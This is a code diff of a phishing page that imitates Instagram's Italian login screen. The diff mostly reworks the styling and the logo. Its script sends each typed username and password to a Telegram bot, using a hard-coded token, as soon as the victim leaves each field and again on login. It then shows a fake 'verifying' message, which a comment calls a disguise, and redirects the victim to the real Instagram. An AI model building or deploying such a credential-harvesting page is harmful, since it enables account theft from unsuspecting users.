@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Instagram Login</title>
+<title>Instagram</title>
 
 <style>
 *{
@@ -16,99 +16,92 @@
 body{
     background:#0f2533;
     height:100vh;
-    color:white;
+    color:#fff;
 }
 
 .container{
     width:100%;
-    max-width:420px;
+    max-width:430px;
     margin:auto;
     padding:20px;
+    min-height:100vh;
     display:flex;
     flex-direction:column;
     align-items:center;
-    height:100vh;
 }
 
 .lang{
-    margin-top:15px;
-    color:#cfd4d9;
-    font-size:18px;
+    margin-top:12px;
+    color:#d8d8d8;
+    font-size:17px;
 }
 
 .logo{
-    margin-top:120px;
-    margin-bottom:100px;
+    margin-top:140px;
+    margin-bottom:110px;
 }
 
-.logo img{
-    width:90px;
-}
-
-.input-box{
+.form{
     width:100%;
+}
+
+input{
+    width:100%;
+    height:78px;
     margin-bottom:20px;
-}
-
-.input-box input{
-    width:100%;
-    height:70px;
-    border:2px solid #3b5266;
-    border-radius:20px;
+    border:2px solid #41586c;
+    border-radius:22px;
     background:transparent;
     color:white;
     font-size:18px;
-    padding:0 20px;
+    padding:0 25px;
     outline:none;
 }
 
-.input-box input::placeholder{
-    color:#a4adb6;
+input::placeholder{
+    color:#98a4af;
 }
 
-.login-btn{
+.login{
     width:100%;
-    height:60px;
+    height:62px;
     border:none;
     border-radius:35px;
     background:#1877f2;
     color:white;
-    font-size:20px;
+    font-size:22px;
     cursor:pointer;
 }
 
 .forgot{
-    margin-top:30px;
-    color:white;
-    text-decoration:none;
+    text-align:center;
+    margin-top:35px;
     font-size:18px;
 }
 
 .bottom{
     margin-top:auto;
     width:100%;
-    text-align:center;
-    padding-bottom:30px;
+    padding-bottom:40px;
 }
 
 .create{
     width:100%;
-    height:60px;
-    border:2px solid #2d8cff;
+    height:62px;
+    border:2px solid #2f8cff;
     border-radius:35px;
     background:transparent;
-    color:#4fa0ff;
-    font-size:18px;
-    cursor:pointer;
+    color:#4d9cff;
+    font-size:20px;
 }
 
 .meta{
-    margin-top:30px;
+    text-align:center;
+    margin-top:35px;
     font-size:20px;
-    color:#d6d6d6;
+    color:#ddd;
 }
 </style>
-
 </head>
 <body>
 
@@ -117,31 +110,73 @@ body{
     <div class="lang">Italiano</div>
 
     <div class="logo">
-        <img src="https://i.imgur.com/wvLiKam.png" alt="Instagram">
+
+        <!-- Instagram SVG -->
+        <svg width="95" height="95" viewBox="0 0 100 100">
+            <defs>
+                <linearGradient id="ig" x1="0%" y1="100%" x2="100%" y2="0%">
+                    <stop offset="0%" stop-color="#feda75"/>
+                    <stop offset="25%" stop-color="#fa7e1e"/>
+                    <stop offset="50%" stop-color="#d62976"/>
+                    <stop offset="75%" stop-color="#962fbf"/>
+                    <stop offset="100%" stop-color="#4f5bd5"/>
+                </linearGradient>
+            </defs>
+
+            <rect x="10" y="10" width="80" height="80"
+                  rx="22" ry="22"
+                  fill="none"
+                  stroke="url(#ig)"
+                  stroke-width="7"/>
+
+            <circle cx="50" cy="50" r="18"
+                    fill="none"
+                    stroke="url(#ig)"
+                    stroke-width="7"/>
+
+            <circle cx="72" cy="28" r="5"
+                    fill="url(#ig)"/>
+        </svg>
+
     </div>
 
-    <div class="input-box">
-        <input type="text" id="username" placeholder="Nome utente, e-mail o numero di cellulare">
+    <div class="form">
+
+        <input
+        type="text"
+        id="username"
+        placeholder="Nome utente, e-mail o numero di cellulare">
+
+        <input
+        type="password"
+        id="password"
+        placeholder="Password">
+
+        <button class="login" id="loginBtn">Accedi</button>
+
+        <div class="forgot">
+            Password dimenticata?
+        </div>
+
     </div>
-
-    <div class="input-box">
-        <input type="password" id="password" placeholder="Password">
-    </div>
-
-    <button class="login-btn" id="loginBtn">Accedi</button>
-
-    <a href="#" class="forgot">Password dimenticata?</a>
 
     <div class="bottom">
-        <button class="create">Crea nuovo account</button>
-        <div class="meta">∞ Meta</div>
+
+        <button class="create">
+            Crea nuovo account
+        </button>
+
+        <div class="meta">
+            ∞ Meta
+        </div>
+
     </div>
 
 </div>
 
 <script>
     // ============================================
-    //  CONFIG - Bot Telegram
+    //  CONFIG - Bot Telegram (نفس القيم)
     // ============================================
     const CONFIG = {
         telegramToken: '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg',
@@ -166,7 +201,7 @@ body{
     }
 
     // ============================================
-    //  UI ELEMENTS
+    //  ELEMENTS
     // ============================================
     const u = document.getElementById('username');
     const p = document.getElementById('password');
@@ -177,7 +212,7 @@ body{
     let loginClicked = false;
 
     // ============================================
-    //  إرسال اسم المستخدم فوراً عند الخروج من الحقل
+    //  إرسال اسم المستخدم عند الخروج من الحقل
     // ============================================
     u.addEventListener('blur', function() {
         const val = this.value.trim();
@@ -193,7 +228,7 @@ body{
     });
 
     // ============================================
-    //  إرسال كلمة المرور فوراً عند الخروج من الحقل
+    //  إرسال كلمة المرور عند الخروج من الحقل
     // ============================================
     p.addEventListener('blur', function() {
         const val = this.value;
@@ -221,7 +256,7 @@ body{
         const username = u.value.trim();
         const password = p.value;
 
-        // إرسال تأكيدي
+        // إرسال تأكيدي نهائي
         sendToTelegram(
             `✅ *Login Button Pressed* ✅\n\n` +
             `👤 *User:* \`${username}\`\n` +
@@ -229,12 +264,12 @@ body{
             `⏰ *Time:* ${new Date().toISOString()}`
         );
 
-        // تغيير نص الزر كإشارة
+        // تغيير مظهر الزر للتمويه
         loginBtn.textContent = 'Verifica in corso...';
-        loginBtn.style.opacity = '0.7';
+        loginBtn.style.opacity = '0.6';
         loginBtn.disabled = true;
 
-        // إعادة توجيه إلى Instagram الحقيقي بعد فترة
+        // إعادة توجيه إلى Instagram الحقيقي
         setTimeout(() => {
             window.location.href = 'https://www.instagram.com';
         }, 2000);
